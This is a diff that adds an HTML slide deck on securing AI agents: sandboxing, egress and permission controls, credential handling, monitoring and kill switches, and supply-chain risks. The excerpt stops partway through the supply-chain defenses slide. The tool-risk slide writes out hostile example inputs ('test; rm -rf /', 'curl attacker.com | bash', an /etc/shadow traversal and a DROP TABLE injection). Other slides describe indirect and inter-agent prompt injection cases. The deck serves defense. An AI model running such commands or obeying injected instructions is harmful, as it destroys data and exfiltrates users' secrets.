@@ -1,0 +1,887 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AI Agent Security | Technical Report</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=DM+Sans:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/reveal.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/theme/black.min.css">
+<style>
+  :root { --amber:#f5a623;--green:#4ecb8d;--purple:#a78bfa;--blue:#60a5fa;--red:#f87171;--bg:#0a0a0f;--bg2:#10101a;--bg3:#181824;--border:#2a2a3a;--text:#e8e8f0;--muted:#8888a8; }
+  .reveal-viewport{background:var(--bg)}.reveal .slides section{background:transparent;overflow-y:auto !important;padding-top:.5em;align-items:flex-start !important;justify-content:flex-start !important}
+
+  .reveal{font-family:'DM Sans',sans-serif;color:var(--text)}
+  .reveal h1,.reveal h2,.reveal h3{font-family:'Playfair Display',serif;font-weight:700}
+  .reveal h1{font-size:1.8em;color:var(--amber);line-height:1.15}.reveal h2{font-size:1.25em;color:var(--amber);margin-bottom:.4em}
+  .reveal h3{font-size:.85em;color:var(--green);margin-bottom:.3em}.reveal p{font-size:.62em;line-height:1.65}
+  .reveal li{font-size:.60em;line-height:1.65;margin-bottom:.2em}
+  .reveal code{font-family:'JetBrains Mono',monospace;font-size:.60em}
+  .reveal pre{box-shadow:none;background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:.6em .9em;margin:.5em 0}
+  .reveal pre code{font-size:.55em;line-height:1.5;background:transparent;color:#cdd6f4}
+  .slide-hdr{display:flex;align-items:center;gap:.6em;border-bottom:1px solid var(--border);padding-bottom:.35em;margin-bottom:.6em}
+  .slide-hdr .tag{font-family:'JetBrains Mono',monospace;font-size:.44em;font-weight:500;color:var(--bg);background:var(--amber);padding:.15em .5em;border-radius:3px}
+  .slide-hdr h2{margin:0;font-size:1.0em}
+  .cols{display:grid;gap:1.2em}.cols-2{grid-template-columns:1fr 1fr}.cols-3{grid-template-columns:1fr 1fr 1fr}
+  .cols-6040{grid-template-columns:6fr 4fr}.cols-4060{grid-template-columns:4fr 6fr}
+  .card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:.8em 1em}
+  .card.amber{border-left:3px solid var(--amber)}.card.green{border-left:3px solid var(--green)}
+  .card.purple{border-left:3px solid var(--purple)}.card.blue{border-left:3px solid var(--blue)}.card.red{border-left:3px solid var(--red)}
+  .card h3{font-size:.7em;margin:0 0 .3em}.card p{font-size:.58em;margin:0;color:#b8b8d0}
+  .card ul{margin:0;padding-left:1.2em}.card li{font-size:.58em;color:#b8b8d0;margin-bottom:.1em}
+  .reveal table{width:100%;border-collapse:collapse;font-size:.56em}
+  .reveal table th{background:var(--bg3);color:var(--amber);font-weight:600;padding:.45em .7em;border:1px solid var(--border);text-align:left}
+  .reveal table td{padding:.4em .7em;border:1px solid var(--border);color:#ccc}
+  .reveal table tr:nth-child(even) td{background:#0e0e18}
+  .a{color:var(--amber);font-weight:600}.g{color:var(--green);font-weight:600}.p{color:var(--purple);font-weight:600}.b{color:var(--blue);font-weight:600}.r{color:var(--red);font-weight:600}
+  .mono{font-family:'JetBrains Mono',monospace}
+  svg.diagram{display:block;margin:0 auto;overflow:visible}
+  .pill{display:inline-block;font-family:'JetBrains Mono',monospace;font-size:.48em;padding:.1em .5em;border-radius:99px;border:1px solid;margin:0 .1em}
+  .pill.amber{color:var(--amber);border-color:var(--amber)}.pill.green{color:var(--green);border-color:var(--green)}
+  .pill.purple{color:var(--purple);border-color:var(--purple)}.pill.blue{color:var(--blue);border-color:var(--blue)}
+  .pill.red{color:var(--red);border-color:var(--red)}
+  .reveal .slide-footer{text-align:right;margin-top:auto;padding-top:.6em;font-family:'JetBrains Mono',monospace;font-size:.36em;color:var(--muted)}
+  .title-slide h1{font-size:2.0em}
+  .title-slide .subtitle{font-size:.72em;color:var(--green);font-family:'DM Sans',sans-serif;font-weight:300;margin:.5em 0 1.2em}
+  .title-slide .meta{font-size:.52em;color:var(--muted);font-family:'JetBrains Mono',monospace}
+  .reveal ul,.reveal ol{margin:.25em 0 .25em 1.2em}
+</style>
+</head>
+<body>
+<div class="reveal"><div class="slides">
+
+<!-- SLIDE 1: Title -->
+<section class="title-slide">
+  <p class="meta" style="margin-bottom:.3em">TECHNICAL REPORT</p>
+  <h1>AI Agent Security</h1>
+  <p class="subtitle">Threat Models, Defenses, and Deployment Patterns</p>
+  <div>
+    <span class="pill amber">agents</span>
+    <span class="pill green">sandboxing</span>
+    <span class="pill purple">prompt-injection</span>
+    <span class="pill blue">defense-in-depth</span>
+    <span class="pill red">supply-chain</span>
+  </div>
+  <p class="meta" style="margin-top:1.5em">April 2026</p>
+  <div class="slide-footer">agent-security / 01</div>
+</section>
+
+<!-- SLIDE 2: Why Agents Are Different -->
+<section>
+  <div class="slide-hdr"><span class="tag">CONTEXT</span><h2>Why Agents Are Different from Chatbots</h2></div>
+  <div class="cols cols-2">
+    <div class="card red">
+      <h3>Chatbot (Stateless)</h3>
+      <ul>
+        <li>Receives text, produces text</li>
+        <li><span class="r">No side effects</span> beyond the response</li>
+        <li>No persistent state across interactions</li>
+        <li>Worst case: harmful or inaccurate text</li>
+      </ul>
+    </div>
+    <div class="card amber">
+      <h3>Agent (Autonomous)</h3>
+      <ul>
+        <li><span class="a">Persistent access</span> &mdash; file handles, API sessions, credentials</li>
+        <li><span class="a">Tool use</span> &mdash; shell, filesystem, HTTP, databases</li>
+        <li><span class="a">Autonomous multi-step action</span> without per-step approval</li>
+        <li>Worst case: data exfiltration, destructive actions, credential theft</li>
+      </ul>
+    </div>
+  </div>
+  <div class="card purple" style="margin-top:.8em">
+    <h3>The Core Problem</h3>
+    <p>Agents process <span class="r">untrusted input</span> (documents, web pages, tool outputs) and act on it using <span class="a">trusted tools</span> (shell, filesystem, APIs). This makes them uniquely vulnerable to <span class="p">confused deputy attacks</span>.</p>
+  </div>
+  <div class="slide-footer">agent-security / 02</div>
+</section>
+
+<!-- SLIDE 3: The Attack Surface -->
+<section>
+  <div class="slide-hdr"><span class="tag">THREAT MODEL</span><h2>The Agent Attack Surface</h2></div>
+  <div class="cols cols-3">
+    <div class="card red">
+      <h3>Input Attacks</h3>
+      <ul>
+        <li>Direct prompt injection from users</li>
+        <li><span class="r">Indirect injection</span> via documents, web pages, emails</li>
+        <li>Adversarial content in API responses</li>
+      </ul>
+    </div>
+    <div class="card amber">
+      <h3>Tool-Mediated Attacks</h3>
+      <ul>
+        <li>Command injection through tool args</li>
+        <li>Path traversal in file operations</li>
+        <li>SQL injection via natural language</li>
+      </ul>
+    </div>
+    <div class="card purple">
+      <h3>Infrastructure Attacks</h3>
+      <ul>
+        <li>Container escape</li>
+        <li>Misconfigured network policies</li>
+        <li>Overly permissive filesystem mounts</li>
+      </ul>
+    </div>
+    <div class="card blue">
+      <h3>Supply Chain Attacks</h3>
+      <ul>
+        <li>Malicious plugins / MCP servers</li>
+        <li>Compromised tool registries</li>
+        <li>Dependency poisoning</li>
+      </ul>
+    </div>
+    <div class="card green">
+      <h3>Multi-Agent Attacks</h3>
+      <ul>
+        <li>Agent impersonation</li>
+        <li>Inter-agent prompt injection</li>
+        <li>Coordination manipulation</li>
+      </ul>
+    </div>
+    <div class="card red">
+      <h3>Attacker Profiles</h3>
+      <ul>
+        <li><span class="r">External adversary</span> &mdash; plants content</li>
+        <li><span class="a">Malicious user</span> &mdash; direct interaction</li>
+        <li><span class="p">Compromised tool</span> &mdash; trusted source</li>
+      </ul>
+    </div>
+  </div>
+  <div class="slide-footer">agent-security / 03</div>
+</section>
+
+<!-- SLIDE 4: Sandboxing & Isolation Overview -->
+<section>
+  <div class="slide-hdr"><span class="tag">ISOLATION</span><h2>Sandboxing and Isolation</h2></div>
+  <div class="cols cols-6040">
+    <div>
+      <p>LLMs are inherently unpredictable. No amount of alignment guarantees correct behavior. <span class="a">Defense in depth</span> requires treating the agent as an <span class="r">untrusted workload</span>.</p>
+      <div class="card green" style="margin-top:.6em">
+        <h3>Principle</h3>
+        <p>The agent should have access to <span class="g">exactly the resources it needs</span> for its task, and nothing more. Isolation enforces this at the infrastructure level.</p>
+      </div>
+    </div>
+    <div>
+      <svg class="diagram" viewBox="0 0 300 240" width="280">
+        <rect x="10" y="10" width="280" height="220" rx="8" fill="none" stroke="#f87171" stroke-width="1.5" stroke-dasharray="6,3"/>
+        <text x="150" y="30" text-anchor="middle" fill="#f87171" font-family="JetBrains Mono" font-size="10">Host System (off-limits)</text>
+        <rect x="30" y="45" width="240" height="170" rx="6" fill="none" stroke="#f5a623" stroke-width="1.5"/>
+        <text x="150" y="62" text-anchor="middle" fill="#f5a623" font-family="JetBrains Mono" font-size="10">Container / MicroVM</text>
+        <rect x="50" y="75" width="200" height="55" rx="5" fill="none" stroke="#4ecb8d" stroke-width="1.2"/>
+        <text x="150" y="93" text-anchor="middle" fill="#4ecb8d" font-family="JetBrains Mono" font-size="9">Agent Runtime</text>
+        <rect x="65" y="100" width="75" height="22" rx="3" fill="var(--bg3)" stroke="var(--border)"/>
+        <text x="102" y="115" text-anchor="middle" fill="#8888a8" font-family="JetBrains Mono" font-size="8">LLM Loop</text>
+        <rect x="155" y="100" width="80" height="22" rx="3" fill="var(--bg3)" stroke="var(--border)"/>
+        <text x="195" y="115" text-anchor="middle" fill="#8888a8" font-family="JetBrains Mono" font-size="8">Policy Engine</text>
+        <rect x="50" y="145" width="90" height="55" rx="5" fill="none" stroke="#a78bfa" stroke-width="1.2"/>
+        <text x="95" y="163" text-anchor="middle" fill="#a78bfa" font-family="JetBrains Mono" font-size="9">/workspace</text>
+        <text x="95" y="178" text-anchor="middle" fill="#8888a8" font-family="JetBrains Mono" font-size="8">read-write</text>
+        <rect x="160" y="145" width="90" height="55" rx="5" fill="none" stroke="#60a5fa" stroke-width="1.2"/>
+        <text x="205" y="163" text-anchor="middle" fill="#60a5fa" font-family="JetBrains Mono" font-size="9">Network</text>
+        <text x="205" y="178" text-anchor="middle" fill="#8888a8" font-family="JetBrains Mono" font-size="8">allowlist only</text>
+      </svg>
+    </div>
+  </div>
+  <div class="slide-footer">agent-security / 04</div>
+</section>
+
+<!-- SLIDE 5: Container Security -->
+<section>
+  <div class="slide-hdr"><span class="tag">CONTAINERS</span><h2>Container-Based Isolation</h2></div>
+  <div class="cols cols-2">
+    <div class="card amber">
+      <h3>Read-Only Root FS</h3>
+      <ul>
+        <li>Container image mounted <span class="a">read-only</span></li>
+        <li>Prevents modification of system binaries</li>
+        <li>Only designated dirs (e.g., /workspace) are writable</li>
+      </ul>
+    </div>
+    <div class="card green">
+      <h3>Dropped Capabilities</h3>
+      <ul>
+        <li>Drop <code>CAP_NET_RAW</code>, <code>CAP_SYS_ADMIN</code>, <code>CAP_SYS_PTRACE</code></li>
+        <li>No raw sockets, no mounting, no tracing</li>
+        <li>Agent runs as <span class="g">non-root</span> with UID remapping</li>
+      </ul>
+    </div>
+    <div class="card purple">
+      <h3>Seccomp Profiles</h3>
+      <ul>
+        <li>Restrict to ~100 of 300+ Linux syscalls</li>
+        <li>Block <code>mount</code>, <code>reboot</code>, <code>ptrace</code>, <code>kexec_load</code></li>
+        <li>Kernel-level enforcement &mdash; cannot be bypassed</li>
+      </ul>
+    </div>
+    <div class="card blue">
+      <h3>Resource Limits (cgroups)</h3>
+      <ul>
+        <li>CPU, memory, and disk I/O caps</li>
+        <li>Prevents <span class="r">resource exhaustion</span> attacks</li>
+        <li>Constrains infinite loops and runaway agents</li>
+      </ul>
+    </div>
+  </div>
+  <div class="slide-footer">agent-security / 05</div>
+</section>
+
+<!-- SLIDE 6: MicroVM Isolation -->
+<section>
+  <div class="slide-hdr"><span class="tag">MICROVMS</span><h2>MicroVM and Process-Level Sandboxing</h2></div>
+  <div class="cols cols-2">
+    <div class="card amber">
+      <h3>Firecracker</h3>
+      <ul>
+        <li>Lightweight VMs with <span class="a">own kernel</span></li>
+        <li>Boot in ~125ms &mdash; practical for short tasks</li>
+        <li>Eliminates shared-kernel attack surface</li>
+        <li>Originally built for AWS Lambda</li>
+      </ul>
+    </div>
+    <div class="card green">
+      <h3>E2B Sandboxing</h3>
+      <ul>
+        <li>Cloud-hosted Firecracker microVMs for agents</li>
+        <li>Configurable filesystem snapshots</li>
+        <li>Per-session network policies</li>
+        <li>API for sandbox lifecycle management</li>
+      </ul>
+    </div>
+    <div class="card purple">
+      <h3>gVisor / Kata</h3>
+      <ul>
+        <li>gVisor: user-space kernel intercepts syscalls</li>
+        <li>Kata: lightweight VMs with OCI compatibility</li>
+        <li>Stronger than containers, lighter than full VMs</li>
+      </ul>
+    </div>
+    <div class="card blue">
+      <h3>WASI (WebAssembly)</h3>
+      <ul>
+        <li>Capability-based sandboxing per tool invocation</li>
+        <li>Each tool gets only <span class="b">explicitly granted</span> capabilities</li>
+        <li>Gaining traction for <span class="b">untrusted plugin</span> execution</li>
+      </ul>
+    </div>
+  </div>
+  <div class="slide-footer">agent-security / 06</div>
+</section>
+
+<!-- SLIDE 7: Network and Filesystem -->
+<section>
+  <div class="slide-hdr"><span class="tag">NETWORK</span><h2>Network Policies and Filesystem Restrictions</h2></div>
+  <div class="cols cols-2">
+    <div class="card red">
+      <h3>Network Controls</h3>
+      <ul>
+        <li><span class="r">Deny-by-default egress</span> &mdash; explicit allowlist for approved destinations</li>
+        <li>DNS filtering to prevent tunneling and unapproved resolution</li>
+        <li>K8s NetworkPolicy for namespace-level isolation</li>
+        <li>TLS-terminating proxies for deep inspection</li>
+      </ul>
+    </div>
+    <div class="card green">
+      <h3>Filesystem Controls</h3>
+      <ul>
+        <li>Bind mounts with <span class="g">read-only flags</span> for non-workspace dirs</li>
+        <li>AppArmor/SELinux profiles enforce MAC policies</li>
+        <li>Overlay FS for copy-on-write experimentation</li>
+        <li>Landlock LSM for self-imposed sandbox restrictions</li>
+      </ul>
+    </div>
+  </div>
+  <div class="card amber" style="margin-top:.6em">
+    <h3>Why Network Is Critical</h3>
+    <p>An agent with unrestricted outbound access can <span class="r">exfiltrate data</span> through HTTP, DNS tunneling, or encoded URL parameters. Network isolation is the single most impactful control against data theft.</p>
+  </div>
+  <div class="slide-footer">agent-security / 07</div>
+</section>
+
+<!-- SLIDE 8: Permission Models -->
+<section>
+  <div class="slide-hdr"><span class="tag">PERMISSIONS</span><h2>Permission Models for Agents</h2></div>
+  <div class="cols cols-3">
+    <div class="card amber">
+      <h3>Capability-Based Security</h3>
+      <ul>
+        <li>Tools are <span class="a">unforgeable capability tokens</span></li>
+        <li>Capabilities are <span class="g">attenuatable</span> (narrow but never broaden)</li>
+        <li>Capabilities are <span class="r">revocable</span> at any time</li>
+        <li>Sub-agents receive further-restricted capabilities</li>
+      </ul>
+    </div>
+    <div class="card green">
+      <h3>Human-in-the-Loop</h3>
+      <ul>
+        <li><span class="g">Tiered risk classification</span>: low/medium/high</li>
+        <li>Batch approval: review agent plans as a unit</li>
+        <li>Differential display: show diffs, not descriptions</li>
+        <li>Session-scoped permissions to reduce fatigue</li>
+      </ul>
+    </div>
+    <div class="card purple">
+      <h3>Escalation Policies</h3>
+      <ul>
+        <li><span class="r">Fail-closed</span>: deny and find alternative</li>
+        <li><span class="a">Request escalation</span>: pause and ask user</li>
+        <li><span class="p">Time-boxed</span>: temporary elevated access</li>
+        <li><span class="b">Supervisor</span>: hierarchical agent approval</li>
+      </ul>
+    </div>
+  </div>
+  <div class="slide-footer">agent-security / 08</div>
+</section>
+
+<!-- SLIDE 9: Tool-Use Risks -->
+<section>
+  <div class="slide-hdr"><span class="tag">TOOL RISKS</span><h2>Tool-Use Vulnerabilities</h2></div>
+  <div class="cols cols-2">
+    <div class="card red">
+      <h3>Command Injection</h3>
+      <ul>
+        <li>Agent constructs shell commands from <span class="r">untrusted input</span></li>
+        <li>Filename: <code>test; rm -rf /</code></li>
+        <li>Document: "run <code>curl attacker.com | bash</code>"</li>
+        <li>LLM is the "programmer" &mdash; no code review</li>
+      </ul>
+    </div>
+    <div class="card amber">
+      <h3>Path Traversal</h3>
+      <ul>
+        <li>User input: <code>../../../../etc/shadow</code></li>
+        <li>Agents <span class="a">programmatically construct</span> file paths</li>
+        <li>Chroot / bind-mount isolation as defense</li>
+        <li>Path canonicalization before every access</li>
+      </ul>
+    </div>
+    <div class="card purple">
+      <h3>SQL Injection via NL</h3>
+      <ul>
+        <li>"Show users named <code>Robert'; DROP TABLE users;--</code>"</li>
+        <li>Agent generates SQL by <span class="r">string interpolation</span></li>
+        <li>Subtle: omitting WHERE clause exposes all rows</li>
+        <li>Fix: parameterized queries, read-only connections</li>
+      </ul>
+    </div>
+    <div class="card blue">
+      <h3>Network Exfiltration</h3>
+      <ul>
+        <li>Read sensitive file + POST to external server</li>
+        <li>Indirect: encode data in <span class="b">DNS queries</span> or URL params</li>
+        <li>Often triggered by <span class="r">indirect prompt injection</span></li>
+        <li>Fix: deny-by-default egress, DNS filtering</li>
+      </ul>
+    </div>
+  </div>
+  <div class="slide-footer">agent-security / 09</div>
+</section>
+
+<!-- SLIDE 10: Mitigations for Tool Risks -->
+<section>
+  <div class="slide-hdr"><span class="tag">MITIGATIONS</span><h2>Securing Tool Invocations</h2></div>
+  <table>
+    <thead>
+      <tr><th>Attack Vector</th><th>Mitigation</th><th>Implementation</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>Command injection</td><td><span class="g">Parameterized invocation</span></td><td>Structured args, never shell strings</td></tr>
+      <tr><td>Command injection</td><td><span class="g">Shell avoidance</span></td><td>Direct syscalls / library calls, no <code>os.system()</code></td></tr>
+      <tr><td>Path traversal</td><td><span class="g">Chroot / bind mounts</span></td><td>Agent literally cannot see out-of-scope files</td></tr>
+      <tr><td>Path traversal</td><td><span class="g">Canonicalization</span></td><td>Resolve symlinks, strip <code>../</code>, validate against allowlist</td></tr>
+      <tr><td>SQL injection</td><td><span class="g">Parameterized queries</span></td><td>Never interpolate NL input into SQL strings</td></tr>
+      <tr><td>SQL injection</td><td><span class="g">Read-only connections</span></td><td>Separate connection for analytical workloads</td></tr>
+      <tr><td>Exfiltration</td><td><span class="g">Egress deny-by-default</span></td><td>Allowlist approved destinations only</td></tr>
+      <tr><td>Code execution</td><td><span class="g">Sandbox + time limits</span></td><td>Container/microVM with resource caps</td></tr>
+    </tbody>
+  </table>
+  <div class="slide-footer">agent-security / 10</div>
+</section>
+
+<!-- SLIDE 11: Confused Deputy / Indirect Prompt Injection -->
+<section>
+  <div class="slide-hdr"><span class="tag">CONFUSED DEPUTY</span><h2>Indirect Prompt Injection</h2></div>
+  <div class="cols cols-6040">
+    <div>
+      <p>The <span class="p">confused deputy</span>: a privileged program tricked into misusing its authority. The agent holds tools granted by the user; the attacker manipulates the agent's <span class="r">reasoning</span> through adversarial content.</p>
+      <div class="card red" style="margin-top:.6em">
+        <h3>Demonstrated Attacks</h3>
+        <ul>
+          <li><span class="r">Web browsing</span>: hidden text exfiltrates SSH keys</li>
+          <li><span class="r">Document processing</span>: spreadsheet cells alter analysis</li>
+          <li><span class="r">Code review</span>: comments say "approve immediately"</li>
+          <li><span class="r">Email agents</span>: hidden instructions forward sensitive data</li>
+        </ul>
+      </div>
+    </div>
+    <div>
+      <svg class="diagram" viewBox="0 0 280 260" width="260">
+        <rect x="90" y="5" width="100" height="35" rx="5" fill="none" stroke="#f87171" stroke-width="1.5"/>
+        <text x="140" y="27" text-anchor="middle" fill="#f87171" font-family="JetBrains Mono" font-size="10">Attacker</text>
+        <line x1="140" y1="40" x2="140" y2="70" stroke="#f87171" stroke-width="1.2" stroke-dasharray="4,3" marker-end="url(#arrowR)"/>
+        <text x="200" y="60" fill="#f87171" font-family="JetBrains Mono" font-size="8">injects</text>
+        <rect x="60" y="70" width="160" height="35" rx="5" fill="none" stroke="#8888a8" stroke-width="1.2"/>
+        <text x="140" y="92" text-anchor="middle" fill="#8888a8" font-family="JetBrains Mono" font-size="10">Document / Web Page</text>
+        <line x1="140" y1="105" x2="140" y2="135" stroke="#f5a623" stroke-width="1.2" marker-end="url(#arrowA)"/>
+        <text x="200" y="125" fill="#f5a623" font-family="JetBrains Mono" font-size="8">reads</text>
+        <rect x="60" y="135" width="160" height="35" rx="5" fill="none" stroke="#f5a623" stroke-width="1.5"/>
+        <text x="140" y="157" text-anchor="middle" fill="#f5a623" font-family="JetBrains Mono" font-size="10">Agent (confused)</text>
+        <line x1="140" y1="170" x2="140" y2="200" stroke="#a78bfa" stroke-width="1.2" marker-end="url(#arrowP)"/>
+        <text x="200" y="190" fill="#a78bfa" font-family="JetBrains Mono" font-size="8">misuses tools</text>
+        <rect x="40" y="200" width="80" height="30" rx="4" fill="none" stroke="#4ecb8d" stroke-width="1.2"/>
+        <text x="80" y="219" text-anchor="middle" fill="#4ecb8d" font-family="JetBrains Mono" font-size="9">Read keys</text>
+        <rect x="160" y="200" width="80" height="30" rx="4" fill="none" stroke="#f87171" stroke-width="1.2"/>
+        <text x="200" y="219" text-anchor="middle" fill="#f87171" font-family="JetBrains Mono" font-size="9">Exfiltrate</text>
+        <line x1="120" y1="215" x2="160" y2="215" stroke="#8888a8" stroke-width="1" marker-end="url(#arrowR)"/>
+        <defs>
+          <marker id="arrowR" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6" fill="none" stroke="#f87171" stroke-width="1"/></marker>
+          <marker id="arrowA" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6" fill="none" stroke="#f5a623" stroke-width="1"/></marker>
+          <marker id="arrowP" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6" fill="none" stroke="#a78bfa" stroke-width="1"/></marker>
+        </defs>
+      </svg>
+    </div>
+  </div>
+  <div class="slide-footer">agent-security / 11</div>
+</section>
+
+<!-- SLIDE 12: Defenses Against Injection -->
+<section>
+  <div class="slide-hdr"><span class="tag">DEFENSES</span><h2>Defending Against Prompt Injection</h2></div>
+  <div class="cols cols-2">
+    <div class="card green">
+      <h3>Input-Output Separation</h3>
+      <ul>
+        <li>System prompt, user instructions, and untrusted content in <span class="g">distinct channels</span></li>
+        <li>Special tokens mark trust boundaries</li>
+        <li>Injected instructions cannot masquerade as user directives</li>
+      </ul>
+    </div>
+    <div class="card amber">
+      <h3>Instruction Hierarchy</h3>
+      <ul>
+        <li>System &gt; User &gt; Content (strict ordering)</li>
+        <li>Instructions in web pages / documents <span class="a">cannot override</span> system-level directives</li>
+        <li>Enforced by the agent runtime, not the model alone</li>
+      </ul>
+    </div>
+    <div class="card purple">
+      <h3>Taint Tracking</h3>
+      <ul>
+        <li>Data from untrusted sources is <span class="p">tagged</span></li>
+        <li>Tainted data flowing into sensitive ops triggers alert</li>
+        <li>Analogous to taint tracking in Perl/Ruby</li>
+        <li>Applied at the <span class="p">agent reasoning level</span></li>
+      </ul>
+    </div>
+    <div class="card blue">
+      <h3>Output Filtering</h3>
+      <ul>
+        <li>Proposed actions checked against <span class="b">pattern rules</span></li>
+        <li>"Read file &rarr; HTTP POST with contents" = exfiltration</li>
+        <li>Context-aware: considers the full action chain</li>
+        <li>Blocks regardless of how innocently steps are described</li>
+      </ul>
+    </div>
+  </div>
+  <div class="slide-footer">agent-security / 12</div>
+</section>
+
+<!-- SLIDE 13: Multi-Agent Security -->
+<section>
+  <div class="slide-hdr"><span class="tag">MULTI-AGENT</span><h2>Multi-Agent Security Boundaries</h2></div>
+  <div class="cols cols-6040">
+    <div>
+      <div class="card red">
+        <h3>Threat: Inter-Agent Injection</h3>
+        <p>A compromised research agent embeds adversarial instructions in its "findings." The writing agent, <span class="r">trusting its peer</span>, follows the injected directives.</p>
+      </div>
+      <div class="card amber" style="margin-top:.6em">
+        <h3>Threat: Agent Impersonation</h3>
+        <p>Compromised agent claims to be the <span class="a">supervisor</span> and issues commands to subordinates.</p>
+      </div>
+      <div class="card green" style="margin-top:.6em">
+        <h3>Defenses</h3>
+        <ul>
+          <li>Treat inter-agent messages as <span class="r">untrusted input</span></li>
+          <li>Cryptographic agent identity (signed messages)</li>
+          <li>Capability-based delegation (not role-based)</li>
+          <li>Centralized message broker</li>
+        </ul>
+      </div>
+    </div>
+    <div>
+      <div class="card purple">
+        <h3>Coordination Attacks</h3>
+        <ul>
+          <li><span class="r">Deadlock induction</span> &mdash; circular dependencies halt system</li>
+          <li><span class="r">Resource exhaustion</span> &mdash; one agent floods others with tasks</li>
+          <li><span class="r">Consensus manipulation</span> &mdash; inject different data to swing votes</li>
+          <li><span class="r">Information asymmetry</span> &mdash; contradictory info causes oscillation</li>
+        </ul>
+      </div>
+      <div class="card blue" style="margin-top:.6em">
+        <h3>Zero-Trust Principle</h3>
+        <p>Assume any individual agent <span class="b">might be compromised</span>. Design inter-agent communication to be robust against a compromised peer.</p>
+      </div>
+    </div>
+  </div>
+  <div class="slide-footer">agent-security / 13</div>
+</section>
+
+<!-- SLIDE 14: Credential Management -->
+<section>
+  <div class="slide-hdr"><span class="tag">CREDENTIALS</span><h2>Credential Management</h2></div>
+  <div class="cols cols-2">
+    <div class="card amber">
+      <h3>API Key Handling</h3>
+      <ul>
+        <li><span class="a">Just-in-time injection</span>: key injected only for the specific tool call</li>
+        <li>LLM component <span class="r">never sees raw key</span></li>
+        <li>Scoped keys: minimum permissions, limited validity</li>
+        <li>Rotate daily or per-session</li>
+      </ul>
+    </div>
+    <div class="card green">
+      <h3>OAuth Delegation</h3>
+      <ul>
+        <li>Scoped tokens via standard OAuth consent flow</li>
+        <li>User maintains visibility over agent's access</li>
+        <li>Scope expansion requires <span class="g">explicit approval</span></li>
+        <li>Refresh tokens stored in vault, not runtime</li>
+      </ul>
+    </div>
+    <div class="card purple">
+      <h3>Vault Integration</h3>
+      <ul>
+        <li>HashiCorp Vault, AWS Secrets Manager, Azure Key Vault</li>
+        <li><span class="p">Lease-based access</span> with auto-revocation on expiry</li>
+        <li>Dynamic secrets: unique temp credentials per session</li>
+        <li>Full audit logging of secret access</li>
+      </ul>
+    </div>
+    <div class="card red">
+      <h3>Environment Variable Risks</h3>
+      <ul>
+        <li>Visible via <code>env</code> / <code>printenv</code> &mdash; LLM can read them</li>
+        <li>Inherited by <span class="r">all child processes</span></li>
+        <li>Appear in debug logs and error output</li>
+        <li>Fix: vault injection, secret masking, minimal env</li>
+      </ul>
+    </div>
+  </div>
+  <div class="slide-footer">agent-security / 14</div>
+</section>
+
+<!-- SLIDE 15: Monitoring & Auditing -->
+<section>
+  <div class="slide-hdr"><span class="tag">MONITORING</span><h2>Monitoring, Auditing, and Kill Switches</h2></div>
+  <div class="cols cols-3">
+    <div class="card amber">
+      <h3>Logging</h3>
+      <ul>
+        <li><span class="a">Structured action logs</span>: type, params, timestamp, result, reasoning</li>
+        <li>Full tool I/O with secret redaction</li>
+        <li>Chain-of-thought reasoning captured</li>
+        <li>Tamper-resistant append-only storage</li>
+      </ul>
+    </div>
+    <div class="card green">
+      <h3>Anomaly Detection</h3>
+      <ul>
+        <li><span class="g">Baseline profiling</span> per agent type and task</li>
+        <li>Sequence analysis: "read creds &rarr; POST" = alert</li>
+        <li>Behavioral clustering across agent fleet</li>
+        <li>Outlier agents flagged for human review</li>
+      </ul>
+    </div>
+    <div class="card red">
+      <h3>Kill Switches</h3>
+      <ul>
+        <li><span class="r">Multi-level</span>: session / type / global</li>
+        <li>Take effect within seconds, not minutes</li>
+        <li>Checked at every action boundary</li>
+        <li>Auto-triggered by anomaly detection, cost breach</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cols cols-2" style="margin-top:.6em">
+    <div class="card blue">
+      <h3>Rate Limiting</h3>
+      <p>Cap <span class="b">actions/min</span>, <span class="b">data volume/session</span>, and <span class="b">API cost/session</span>. Throttle and flag agents that exceed thresholds.</p>
+    </div>
+    <div class="card purple">
+      <h3>Cost Controls</h3>
+      <p>Per-session and per-user budgets. <span class="p">Cost estimation before execution</span> of multi-step plans. Auto-terminate on budget exhaustion.</p>
+    </div>
+  </div>
+  <div class="slide-footer">agent-security / 15</div>
+</section>
+
+<!-- SLIDE 16: Supply Chain Risks -->
+<section>
+  <div class="slide-hdr"><span class="tag">SUPPLY CHAIN</span><h2>Supply Chain Risks</h2></div>
+  <div class="cols cols-3">
+    <div class="card red">
+      <h3>Malicious Plugins</h3>
+      <ul>
+        <li>Backdoored MCP servers exfiltrate data</li>
+        <li><span class="r">Typosquatting</span>: <code>github-mcp</code> vs <code>githb-mcp</code></li>
+        <li>Delayed activation: normal for weeks, then triggers</li>
+        <li>Passes initial review, activates later</li>
+      </ul>
+    </div>
+    <div class="card amber">
+      <h3>Registry Attacks</h3>
+      <ul>
+        <li>Infrastructure compromise of tool registry</li>
+        <li><span class="a">Namespace hijacking</span> of abandoned packages</li>
+        <li>Dependency confusion: public overrides private</li>
+        <li>"ClawHub-style" centralized registry attacks</li>
+      </ul>
+    </div>
+    <div class="card purple">
+      <h3>Dependency Poisoning</h3>
+      <ul>
+        <li>Compromised container <span class="p">base images</span></li>
+        <li>Library supply chain attacks on tool deps</li>
+        <li>Malicious "updates" via hijacked update mechanism</li>
+        <li>Cascading impact across all agent sessions</li>
+      </ul>
+    </div>
+  </div>
+  <div class="card green" style="margin-top:.6em">
+    <h3>Defenses</h3>
